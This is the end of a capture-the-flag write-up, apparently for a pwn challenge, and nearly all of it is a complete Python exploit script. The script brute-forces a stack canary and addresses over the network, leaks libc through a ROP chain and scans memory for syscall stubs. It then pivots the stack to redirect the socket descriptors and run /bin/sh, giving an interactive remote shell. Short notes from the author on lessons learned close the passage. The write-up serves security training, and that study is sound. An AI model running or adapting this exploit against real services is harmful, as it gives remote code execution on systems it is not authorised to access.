payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds) # ret to this gadget
payload += p64(0x0 ^ Ds)                 # pop rsi
payload += p64(0xdeadbeefdeadbeef)       # pop r15 (dont care)
payload += p64(dup2_remote_addr ^ Ds)           # call dup2

# dup2(4,1)
payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
payload += p64(0x4 ^ Ds)  # pop this to RDI (socket's FD)
payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)  # ret to this gadget
payload += p64(0x1 ^ Ds)  # pop rsi
payload += p64(0xdeadbeefdeadbeef)  # pop r15 (dont care)
payload += p64(dup2_remote_addr ^ Ds)  # call dup2

# When back from dup2, load arguments for execve
payload += p64(gadget_pop_rdi_ret ^ Ds)

stack_bin_sh = buffer_addr + 224  # will be placed in a few line from now
payload += p64(stack_bin_sh ^ Ds)

# Second argument for execve = NULL
payload += p64(gadget_pop_rdx_ret ^ Ds)
payload += p64(0x0 ^ Ds)

# Third argument for execve = NULL
payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
payload += p64(0x0 ^ Ds)
payload += p64(0xdeadbeefdeadbeef ^ Ds)

# jump to execve
payload += p64((gadget_pop_rdx_ret + 1) ^ Ds)
payload += p64(execve_remote_addr ^ Ds)


# place /bin/sh on the stack 
payload += "".join([chr(ord(t) ^ 0xd) for t in "/bin/sh"])
payload += chr(0x0 ^ 0xd)  # terminating null

# Pad to the end of buffer
payload += "B" * (1032 - len(payload))
payload += p64(canary ^ Ds)
payload += p64(buffer_addr ^ Ds)
payload += p64(text_section_leave_ret ^ Ds)

sock = socket.socket()
sock.connect(SERVER)
sock.recv(4096)  # server hello
sock.send(payload)
#interactive mode
t = Telnet()
t.sock = sock
print "Starting interactive session:"
t.interact()
sock.close()
```
Note: to use an interactive mode for the shell I used `from telnetlib import Telnet` to make it easier to interact with the server once I have shell.

Final script:
```python
import socket
import struct
from telnetlib import Telnet

Ds = 0x0d0d0d0d0d0d0d0d

def p64(s):
    return struct.pack("Q", s)

def unpack(s):
    return struct.unpack("Q", s)[0]

SERVER = ("localhost", 1337)

def send_payload(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(SERVER)
    s.recv(4096)
    s.send(p)

    res = False
    try:
        line = s.recv(4096)
        res = "Username found!" in line

    finally:
        s.close()

    return res

def leak_next_byte(prefix):
    for test_byte in [chr(t) for t in range(256)]:
        if send_payload(prefix + test_byte):
            print "Found:", hex(ord(test_byte))
            return prefix + test_byte

def leak_n_bytes(prefix, n):
    payload = prefix
    for i in range(n):
        payload = leak_next_byte(payload)
    return unpack(payload[-8:]) ^ Ds


def main():
    payload = "davide"
    payload += "B" * (1032 - len(payload))

    print "Leaking canary", 
    canary = leak_n_bytes(payload, 8)
    print "{}".format(hex(canary))

    print "Leaking old RBP"
    old_rbp = leak_n_bytes(payload + p64(canary ^ Ds) , 8)
    print "{}".format(hex(old_rbp))

    print "Leaking return address"
    ret_addr = leak_n_bytes(payload + p64(canary ^ Ds) + p64(old_rbp ^ Ds) + chr(ord("\xcf") ^ 0xd), 7)
    print "{}".format(hex(ret_addr))

    text_section_base = ret_addr & 0xfffffffffffff000
    text_section_leave_ret = text_section_base + 0xc5c
    buffer_addr       = old_rbp - 0x480

    gadget_pop_rsi_pop_r15_ret = text_section_base + 0xf71
    gadget_pop_rdi_ret         = text_section_base + 0xf73
    gadget_pop_rdx_ret         = text_section_base + 0xb53

    text_section_write_got = text_section_base + 0x202020
    text_section_write_plt = text_section_base + 0x910

    # After leaking the necessary values,
    # We create a new payload
    payload = "davide" + "AA"

    payload += p64(gadget_pop_rdi_ret ^ Ds)
    payload += p64(0x4 ^ Ds)
    payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
    payload += p64(text_section_write_got ^ Ds)
    payload += p64(0x1337)   # pop r15, dont-care
    payload += p64(gadget_pop_rdx_ret ^ Ds)
    payload += p64(0x8 ^ Ds)
    payload += p64(text_section_write_plt ^ Ds)


    # Pad to the end of buffer
    payload += "B" * (1032 - len(payload))

    payload += p64(canary ^ Ds)
    payload += p64(buffer_addr ^ Ds)
    payload += p64(text_section_leave_ret ^ Ds)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(SERVER)
    s.recv(4096)  # server hello
    s.send(payload)

    write_libc = s.recv(8)
    print "write@libc:", hex(unpack(write_libc))
    s.close()

    # Libc scan
    libc_page = unpack(write_libc) & 0xfffffffffffff000
    page_size = 0x1000
    dup2_start      = "".join([chr(t) for t in [0xb8,	0x21,	0x00,	0x00,	0x00,	0x0f,	0x05]])
    execve_start    = "".join([chr(t) for t in [0xb8,	0x3b,	0x00,	0x00,	0x00,	0x0f,	0x05]])

    dup2_remote_addr = 0
    execve_remote_addr = 0

    # scan down
    print "Scanning down"
    while dup2_remote_addr == 0 or execve_remote_addr == 0:
        try:
            payload = "davide" + "AA"
            payload += p64(gadget_pop_rdi_ret ^ Ds)
            payload += p64(0x4 ^ Ds)
            payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
            payload += p64(libc_page ^ Ds)   # buffer = page
            payload += p64(0x1337)   # pop r15, dont-care
            payload += p64(gadget_pop_rdx_ret ^ Ds)
            payload += p64(page_size ^ Ds)  # length
            payload += p64(text_section_write_plt ^ Ds)
            # Pad to the end of buffer
            payload += "B" * (1032 - len(payload))
            payload += p64(canary ^ Ds)
            payload += p64(buffer_addr ^ Ds)
            payload += p64(text_section_leave_ret ^ Ds)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(SERVER)
            s.recv(4096)  # server hello
            s.send(payload)

            page_data = s.recv(page_size)
            if len(page_data) == 0:
                break

            if dup2_start in page_data:
                dup2_remote_addr = libc_page + page_data.index(dup2_start)
                print "Found dup2 @ {}".format(hex(dup2_remote_addr))

            
            if execve_start in page_data:
                execve_remote_addr = libc_page + page_data.index(execve_start)
                print "Found execve @ {}".format(hex(execve_remote_addr))


            s.close()
            libc_page -= page_size  # scan down

        except EOFError:
            break


    # scan up
    print "scanning up"
    libc_page = unpack(write_libc) & 0xfffffffffffff000
    while dup2_remote_addr == 0 or execve_remote_addr == 0:
        try:
            payload = "davide" + "AA"
            payload += p64(gadget_pop_rdi_ret ^ Ds)
            payload += p64(0x4 ^ Ds)
            payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
            payload += p64(libc_page ^ Ds)   # buffer = page
            payload += p64(0x1337)   # pop r15, dont-care
            payload += p64(gadget_pop_rdx_ret ^ Ds)
            payload += p64(page_size ^ Ds)  # length
            payload += p64(text_section_write_plt ^ Ds)
            # Pad to the end of buffer
            payload += "B" * (1032 - len(payload))
            payload += p64(canary ^ Ds)
            payload += p64(buffer_addr ^ Ds)
            payload += p64(text_section_leave_ret ^ Ds)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(SERVER)
            s.recv(4096)  # server hello
            s.send(payload)

            page_data = s.recv(page_size)
            if len(page_data) == 0:
                break

            if dup2_start in page_data:
                dup2_remote_addr = libc_page + page_data.index(dup2_start)
                print "Found dup2 @ {}".format(hex(dup2_remote_addr))

            
            if execve_start in page_data:
                execve_remote_addr = libc_page + page_data.index(execve_start)
                print "Found execve @ {}".format(hex(execve_remote_addr))


            s.close()
            libc_page += page_size  # scan down
        except EOFError:
            break

    print "libc scan over"
    text_section_close_plt = text_section_base + 0x960


    # Final payload for remote shell
    payload = "davide" + "AA"  # address of that is buffer_start_addr

    # close(0)
    payload += p64(gadget_pop_rdi_ret ^ Ds)  # first, we ret here <---- (
    payload += p64(0x0 ^ Ds)                 # pop this to RDI
    payload += p64(text_section_close_plt ^ Ds)           # ret there

    # close(1)
    payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
    payload += p64(0x1 ^ Ds)                 # pop this to RDI
    payload += p64(text_section_close_plt ^ Ds)           # ret there

    # dup2(4,0)
    payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
    payload += p64(0x4 ^ Ds)                 # pop this to RDI (socket's FD)
    payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds) # ret to this gadget
    payload += p64(0x0 ^ Ds)                 # pop rsi
    payload += p64(0xdeadbeefdeadbeef)       # pop r15 (dont care)
    payload += p64(dup2_remote_addr ^ Ds)           # call dup2

    # dup2(4,1)
    payload += p64(gadget_pop_rdi_ret ^ Ds)  # return from above to here
    payload += p64(0x4 ^ Ds)  # pop this to RDI (socket's FD)
    payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)  # ret to this gadget
    payload += p64(0x1 ^ Ds)  # pop rsi
    payload += p64(0xdeadbeefdeadbeef)  # pop r15 (dont care)
    payload += p64(dup2_remote_addr ^ Ds)  # call dup2

    # When back from dup2, load arguments for execve
    payload += p64(gadget_pop_rdi_ret ^ Ds)

    stack_bin_sh = buffer_addr + 224  # will be placed in a few line from now
    payload += p64(stack_bin_sh ^ Ds)

    # Second argument for execve = NULL
    payload += p64(gadget_pop_rdx_ret ^ Ds)
    payload += p64(0x0 ^ Ds)

    # Third argument for execve = NULL
    payload += p64(gadget_pop_rsi_pop_r15_ret ^ Ds)
    payload += p64(0x0 ^ Ds)
    payload += p64(0xdeadbeefdeadbeef ^ Ds)

    # jump to execve
    payload += p64((gadget_pop_rdx_ret + 1) ^ Ds)
    payload += p64(execve_remote_addr ^ Ds)


    # place /bin/sh on the stack 
    payload += "".join([chr(ord(t) ^ 0xd) for t in "/bin/sh"])
    payload += chr(0x0 ^ 0xd)  # terminating null

    # Pad to the end of buffer
    payload += "B" * (1032 - len(payload))
    payload += p64(canary ^ Ds)
    payload += p64(buffer_addr ^ Ds)
    payload += p64(text_section_leave_ret ^ Ds)

    sock = socket.socket()
    sock.connect(SERVER)
    sock.recv(4096)  # server hello
    sock.send(payload)
    #interactive mode
    t = Telnet()
    t.sock = sock
    print "Starting interactive session:"
    t.interact()
    sock.close()



if __name__ == "__main__":
    main()
```


### Note to self

This challenge was more difficult than I've expected. I thought that I have pretty much have seen it all when it comes to pwn challenges and everything I would encounter is just more complex programs... I was wrong!

* The frame pointer on the stack, usually ignored, can be very important when you do not have enough bytes to override past the buffer! understanding the `leave` instruction and stack pivoting turns out to be very helpful here

* Not finding the leaked libc address in the databases was very frustrating... but then again, this could happen in the real world - I guess sometimes you encounter library versions and small modifications that make you come up with creative solutions like scanning the entire thing for gadgets yourself

* Docker, a very cool tool to have that I definitely need to learn more about
